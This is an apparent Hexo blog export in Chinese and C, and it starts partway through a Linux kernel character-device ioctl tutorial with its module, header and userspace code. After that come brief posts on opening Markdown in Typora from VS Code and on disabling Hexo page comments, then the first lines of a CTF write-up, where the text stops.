class="type">static</span> <span class="type">atomic_t</span> already_open = ATOMIC_INIT(CDEV_NOT_USED); </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* The message the device will give when asked */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">char</span> message[BUF_LEN + <span class="number">1</span>]; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">cls</span>;</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This is called whenever a process attempts to open the device file */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_info(<span class="string">&quot;device_open(%p)\n&quot;</span>, file); </span><br><span class="line"> </span><br><span class="line">    try_module_get(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> SUCCESS; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_info(<span class="string">&quot;device_release(%p,%p)\n&quot;</span>, inode, file); </span><br><span class="line"> </span><br><span class="line">    module_put(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> SUCCESS; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called whenever a process which has already opened the </span></span><br><span class="line"><span class="comment"> * device file attempts to read from it. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_read</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="comment">/* see include/linux/fs.h   */</span> </span></span><br><span class="line"><span class="params">                           <span class="type">char</span> __user *buffer, <span class="comment">/* buffer to be filled  */</span> </span></span><br><span class="line"><span class="params">                           <span class="type">size_t</span> length, <span class="comment">/* length of the buffer     */</span> </span></span><br><span class="line"><span class="params">                           <span class="type">loff_t</span> *offset)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">/* Number of bytes actually written to the buffer */</span> </span><br><span class="line">    <span class="type">int</span> bytes_read = <span class="number">0</span>; </span><br><span class="line">    <span class="comment">/* How far did the process reading the message get? Useful if the message </span></span><br><span class="line"><span class="comment">     * is larger than the size of the buffer we get to fill in device_read. </span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *message_ptr = message; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!*(message_ptr + *offset)) &#123; <span class="comment">/* we are at the end of message */</span> </span><br><span class="line">        *offset = <span class="number">0</span>; <span class="comment">/* reset the offset */</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* signify end of file */</span> </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    message_ptr += *offset; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Actually put the data into the buffer */</span> </span><br><span class="line">    <span class="keyword">while</span> (length &amp;&amp; *message_ptr) &#123; </span><br><span class="line">        <span class="comment">/* Because the buffer is in the user data segment, not the kernel </span></span><br><span class="line"><span class="comment">         * data segment, assignment would not work. Instead, we have to </span></span><br><span class="line"><span class="comment">         * use put_user which copies data from the kernel data segment to </span></span><br><span class="line"><span class="comment">         * the user data segment. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        put_user(*(message_ptr++), buffer++); </span><br><span class="line">        length--; </span><br><span class="line">        bytes_read++; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;Read %d bytes, %ld left\n&quot;</span>, bytes_read, length); </span><br><span class="line"> </span><br><span class="line">    *offset += bytes_read; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Read functions are supposed to return the number of bytes actually </span></span><br><span class="line"><span class="comment">     * inserted into the buffer. </span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    <span class="keyword">return</span> bytes_read; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* called when somebody tries to write into our device file. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buffer, </span></span><br><span class="line"><span class="params">                            <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> i; </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;device_write(%p,%p,%ld)&quot;</span>, file, buffer, length); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length &amp;&amp; i &lt; BUF_LEN; i++) </span><br><span class="line">        get_user(message[i], buffer + i); </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Again, return the number of input characters used. */</span> </span><br><span class="line">    <span class="keyword">return</span> i; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called whenever a process tries to do an ioctl on our </span></span><br><span class="line"><span class="comment"> * device file. We get two extra parameters (additional to the inode and file </span></span><br><span class="line"><span class="comment"> * structures, which all device functions get): the number of the ioctl called </span></span><br><span class="line"><span class="comment"> * and the parameter given to the ioctl function. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the ioctl is write or read/write (meaning output is returned to the </span></span><br><span class="line"><span class="comment"> * calling process), the ioctl call returns the output of this function. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">long</span> </span><br><span class="line"><span class="title function_">device_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="comment">/* ditto */</span> </span></span><br><span class="line"><span class="params">             <span class="type">unsigned</span> <span class="type">int</span> ioctl_num, <span class="comment">/* number and param for ioctl */</span> </span></span><br><span class="line"><span class="params">             <span class="type">unsigned</span> <span class="type">long</span> ioctl_param)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> i; </span><br><span class="line">    <span class="type">long</span> ret = SUCCESS; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* We don&#x27;t want to talk to two processes at the same time. */</span> </span><br><span class="line">    <span class="keyword">if</span> (atomic_cmpxchg(&amp;already_open, CDEV_NOT_USED, CDEV_EXCLUSIVE_OPEN)) </span><br><span class="line">        <span class="keyword">return</span> -EBUSY; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Switch according to the ioctl called */</span> </span><br><span class="line">    <span class="keyword">switch</span> (ioctl_num) &#123; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_SET_MSG: &#123; </span><br><span class="line">        <span class="comment">/* Receive a pointer to a message (in user space) and set that to </span></span><br><span class="line"><span class="comment">         * be the device&#x27;s message. Get the parameter given to ioctl by </span></span><br><span class="line"><span class="comment">         * the process. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        <span class="type">char</span> __user *tmp = (<span class="type">char</span> __user *)ioctl_param; </span><br><span class="line">        <span class="type">char</span> ch; </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Find the length of the message */</span> </span><br><span class="line">        get_user(ch, tmp); </span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; ch &amp;&amp; i &lt; BUF_LEN; i++, tmp++) </span><br><span class="line">            get_user(ch, tmp); </span><br><span class="line"> </span><br><span class="line">        device_write(file, (<span class="type">char</span> __user *)ioctl_param, i, <span class="literal">NULL</span>); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_GET_MSG: &#123; </span><br><span class="line">        <span class="type">loff_t</span> offset = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Give the current message to the calling process - the parameter </span></span><br><span class="line"><span class="comment">         * we got is a pointer, fill it. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        i = device_read(file, (<span class="type">char</span> __user *)ioctl_param, <span class="number">99</span>, &amp;offset); </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Put a zero at the end of the buffer, so it will be properly </span></span><br><span class="line"><span class="comment">         * terminated. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        put_user(<span class="string">&#x27;\0&#x27;</span>, (<span class="type">char</span> __user *)ioctl_param + i); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_GET_NTH_BYTE: </span><br><span class="line">        <span class="comment">/* This ioctl is both input (ioctl_param) and output (the return </span></span><br><span class="line"><span class="comment">         * value of this function). </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        ret = (<span class="type">long</span>)message[ioctl_param]; </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* We&#x27;re now ready for our next caller */</span> </span><br><span class="line">    <span class="type">atomic_set</span>(&amp;already_open, CDEV_NOT_USED); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Module Declarations */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This structure will hold the functions to be called when a process does </span></span><br><span class="line"><span class="comment"> * something to the device we created. Since a pointer to this structure </span></span><br><span class="line"><span class="comment"> * is kept in the devices table, it can&#x27;t be local to init_module. NULL is </span></span><br><span class="line"><span class="comment"> * for unimplemented functions. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123; </span><br><span class="line">    .read = device_read, </span><br><span class="line">    .write = device_write, </span><br><span class="line">    .unlocked_ioctl = device_ioctl, </span><br><span class="line">    .open = device_open, </span><br><span class="line">    .release = device_release, <span class="comment">/* a.k.a. close */</span> </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Initialize the module - Register the character device */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">chardev2_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">/* Register the character device (atleast try) */</span> </span><br><span class="line">    <span class="type">int</span> ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &amp;fops); </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Negative values signify an error */</span> </span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        pr_alert(<span class="string">&quot;%s failed with %d\n&quot;</span>, </span><br><span class="line">                 <span class="string">&quot;Sorry, registering the character device &quot;</span>, ret_val); </span><br><span class="line">        <span class="keyword">return</span> ret_val; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(6, 4, 0) </span></span><br><span class="line">    cls = class_create(DEVICE_FILE_NAME); </span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line">    cls = class_create(THIS_MODULE, DEVICE_FILE_NAME); </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line">    device_create(cls, <span class="literal">NULL</span>, MKDEV(MAJOR_NUM, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_FILE_NAME); </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;Device created on /dev/%s\n&quot;</span>, DEVICE_FILE_NAME); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Cleanup - unregister the appropriate file from /proc */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">chardev2_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    device_destroy(cls, MKDEV(MAJOR_NUM, <span class="number">0</span>)); </span><br><span class="line">    class_destroy(cls); </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Unregister the device */</span> </span><br><span class="line">    unregister_chrdev(MAJOR_NUM, DEVICE_NAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(chardev2_init); </span><br><span class="line">module_exit(chardev2_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>chardev.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * chardev.h - the header file with the ioctl definitions. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The declarations here have to be in a header file, because they need </span></span><br><span class="line"><span class="comment"> * to be known both to the kernel module (in chardev2.c) and the process </span></span><br><span class="line"><span class="comment"> * calling ioctl() (in userspace_ioctl.c). </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CHARDEV_H </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHARDEV_H </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioctl.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* The major device number. We can not rely on dynamic registration </span></span><br><span class="line"><span class="comment"> * any more, because ioctls need to know it. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAJOR_NUM 100 </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Set the message of the device driver */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_SET_MSG _IOW(MAJOR_NUM, 0, char *) </span></span><br><span class="line"><span class="comment">/* _IOW means that we are creating an ioctl command number for passing </span></span><br><span class="line"><span class="comment"> * information from a user process to the kernel module. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The first arguments, MAJOR_NUM, is the major device number we are using. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The second argument is the number of the command (there could be several </span></span><br><span class="line"><span class="comment"> * with different meanings). </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The third argument is the type we want to get from the process to the </span></span><br><span class="line"><span class="comment"> * kernel. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Get the message of the device driver */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_GET_MSG _IOR(MAJOR_NUM, 1, char *) </span></span><br><span class="line"><span class="comment">/* This IOCTL is used for output, to get the message of the device driver. </span></span><br><span class="line"><span class="comment"> * However, we still need the buffer to place the message in to be input, </span></span><br><span class="line"><span class="comment"> * as it is allocated by the process. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Get the n&#x27;th byte of the message */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_GET_NTH_BYTE _IOWR(MAJOR_NUM, 2, int) </span></span><br><span class="line"><span class="comment">/* The IOCTL is used for both input and output. It receives from the user </span></span><br><span class="line"><span class="comment"> * a number, n, and returns message[n]. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* The name of the device file */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_FILE_NAME <span class="string">&quot;char_dev&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_PATH <span class="string">&quot;/dev/char_dev&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><code>userspace_ioctl.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  userspace_ioctl.c - the process to use ioctl&#x27;s to control the kernel module </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *  Until now we could have used cat for input and output.  But now </span></span><br><span class="line"><span class="comment"> *  we need to do ioctl&#x27;s, which require writing our own process.  </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* device specifics, such as ioctl numbers and the  </span></span><br><span class="line"><span class="comment"> * major device file. */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../chardev.h&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> <span class="comment">/* standard I/O */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span> <span class="comment">/* open */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> <span class="comment">/* close */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> <span class="comment">/* exit */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span> <span class="comment">/* ioctl */</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Functions for the ioctl calls */</span> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl_set_msg</span><span class="params">(<span class="type">int</span> file_desc, <span class="type">char</span> *message)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> ret_val; </span><br><span class="line"> </span><br><span class="line">    ret_val = ioctl(file_desc, IOCTL_SET_MSG, message); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ioctl_set_msg failed:%d\n&quot;</span>, ret_val); </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret_val; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl_get_msg</span><span class="params">(<span class="type">int</span> file_desc)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> ret_val; </span><br><span class="line">    <span class="type">char</span> message[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Warning - this is dangerous because we don&#x27;t tell  </span></span><br><span class="line"><span class="comment">   * the kernel how far it&#x27;s allowed to write, so it  </span></span><br><span class="line"><span class="comment">   * might overflow the buffer. In a real production  </span></span><br><span class="line"><span class="comment">   * program, we would have used two ioctls - one to tell </span></span><br><span class="line"><span class="comment">   * the kernel the buffer length and another to give  </span></span><br><span class="line"><span class="comment">   * it the buffer to fill </span></span><br><span class="line"><span class="comment">   */</span> </span><br><span class="line">    ret_val = ioctl(file_desc, IOCTL_GET_MSG, message); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ioctl_get_msg failed:%d\n&quot;</span>, ret_val); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get_msg message:%s&quot;</span>, message); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret_val; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl_get_nth_byte</span><span class="params">(<span class="type">int</span> file_desc)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> i, c; </span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get_nth_byte message:&quot;</span>); </span><br><span class="line"> </span><br><span class="line">    i = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">do</span> &#123; </span><br><span class="line">        c = ioctl(file_desc, IOCTL_GET_NTH_BYTE, i++); </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (c &lt; <span class="number">0</span>) &#123; </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nioctl_get_nth_byte failed at the %d&#x27;th byte:\n&quot;</span>, i); </span><br><span class="line">            <span class="keyword">return</span> c; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">putchar</span>(c); </span><br><span class="line">    &#125; <span class="keyword">while</span> (c != <span class="number">0</span>); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Main - Call the ioctl functions */</span> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> file_desc, ret_val; </span><br><span class="line">    <span class="type">char</span> *msg = <span class="string">&quot;Message passed by ioctl\n&quot;</span>; </span><br><span class="line"> </span><br><span class="line">    file_desc = open(DEVICE_PATH, O_RDWR); </span><br><span class="line">    <span class="keyword">if</span> (file_desc &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t open device file: %s, error:%d\n&quot;</span>, DEVICE_PATH, </span><br><span class="line">               file_desc); </span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE); </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    ret_val = ioctl_set_msg(file_desc, msg); </span><br><span class="line">    <span class="keyword">if</span> (ret_val) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line">    ret_val = ioctl_get_nth_byte(file_desc); </span><br><span class="line">    <span class="keyword">if</span> (ret_val) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line">    ret_val = ioctl_get_msg(file_desc); </span><br><span class="line">    <span class="keyword">if</span> (ret_val) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line"> </span><br><span class="line">    close(file_desc); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">error: </span><br><span class="line">    close(file_desc); </span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/posts/79c0f484/image-20240116115744234.png" class="" title="image-20240116115744234">

]]></content>
      <tags>
        <tag>内核模块</tag>
      </tags>
  </entry>
  <entry>
    <title>VScode使用Typora打开md文件</title>
    <url>/posts/70c2c619.html</url>
    <content><![CDATA[<p>在使用vscode编辑md文件时，如果要用Typora经常需要右键在文件资源管理器打开，然后才能用Typora编辑，非常不方便，因此本文尝试了几个vscode插件。以下为使用总结：</p>
<h2 id="1-Open-in-External-App"><a href="#1-Open-in-External-App" class="headerlink" title="1. Open in External App"></a>1. Open in External App</h2><p>使用Open in External App插件，该插件可以设定指定文件类型的打开方式，例如md，pdf，html等等：</p>
<img src="/posts/70c2c619/image-20241027230326682.png" class="" title="image-20241027230326682">

<p>在vscode的settings.json文件中加入以下配置即可：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;openInExternalApp.openMapper&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="comment">// represent file extension name</span></span><br><span class="line">      <span class="attr">&quot;extensionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;md&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="comment">// the external applications to open the file which extension name is html</span></span><br><span class="line">      <span class="attr">&quot;apps&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="comment">// openCommand can be shell command or the complete executable application path</span></span><br><span class="line">        <span class="comment">// title will be shown in the drop list if there are several apps</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Typora&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isElectronApp&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>评价是不太好用，经常没有反应，后来查看官方文档，发现原因：</p>
<img src="/posts/70c2c619/image-20241027233833001.png" class="" title="image-20241027233833001">

<p>该插件打开md文档时使用了第二种api，此方式无法打开路径存在非ascii字符的文件。因此起名时需要多加注意（不能有中文~~~）</p>
<h2 id="2-Open-in-Typora"><a href="#2-Open-in-Typora" class="headerlink" title="2. Open in Typora"></a>2. Open in Typora</h2><p>该插件则是专门面向Typora打开md文件的</p>
<img src="/posts/70c2c619/image-20241027232443686.png" class="" title="image-20241027232443686">

<p>首先需要将Typora安装路径添加到环境变量，然后在settings.json文件中添加以下内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;ego.power-tools.user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;buttons&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Typora&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tooltip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;使用Typora打开&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;command&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;typora.open&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;onEditorCreated&quot;</span><span class="punctuation">:</span> <span class="string">&quot;if ($vs.window.activeTextEditor.document.languageId === &#x27;markdown&#x27;) &#123; $v[&#x27;button&#x27;].enable(); $v[&#x27;button&#x27;].color = &#x27;&#x27;; &#125; else &#123; $v[&#x27;button&#x27;].disable(); $v[&#x27;button&#x27;].color = &#x27;grey&#x27;;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;onEditorChanged&quot;</span><span class="punctuation">:</span> <span class="string">&quot;if ($vs.window.activeTextEditor.document.languageId === &#x27;markdown&#x27;) &#123; $v[&#x27;button&#x27;].enable(); $v[&#x27;button&#x27;].color = &#x27;&#x27;; &#125; else &#123; $v[&#x27;button&#x27;].disable(); $v[&#x27;button&#x27;].color = &#x27;grey&#x27;;&#125;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>结果报错，醉了~~~：</p>
<img src="/posts/70c2c619/image-20241027233020235.png" class="" title="image-20241027233020235">

<p>可能是太久没有更新导致出现的bug。</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo关闭指定页面评论</title>
    <url>/posts/48c13ed7.html</url>
    <content><![CDATA[<p>发现tags，categories等等页面会默认开启评论功能，因此选择将这些页面评论区关闭<br>在页面index.md中Fontmatter中添加内容即可：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">comments:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h2 id="初始效果"><a href="#初始效果" class="headerlink" title="初始效果"></a>初始效果</h2><img src="/posts/48c13ed7/image-20241028120904569.png" class="" title="image-20241028120904569">

<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><img src="/posts/48c13ed7/image-20241028121032026.png" class="" title="image-20241028121032026">
]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-Beichen-CTF-WP</title>
    <url>/posts/709ed7e9.html</url>
    <content><![CDATA[<p>今年暑假参加了信大举办的北辰计划夏令营，其中最后一天举行了一次CTF比赛，第一批的题目比较难，当时没做出来，现在重新做一下，在此记录。</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><ol>
<li>首先读取输入，判断输入与加密后的字符串，成功才能进入漏洞函数：<img src="/posts/709ed7e9/image-20241028155312928.png" class="" title="image-20241028155312928"><br>直接动态调试可以得到输入应为<code>I_can_find_the_right_path\n</code>，然后进入存在漏洞函数；</li>
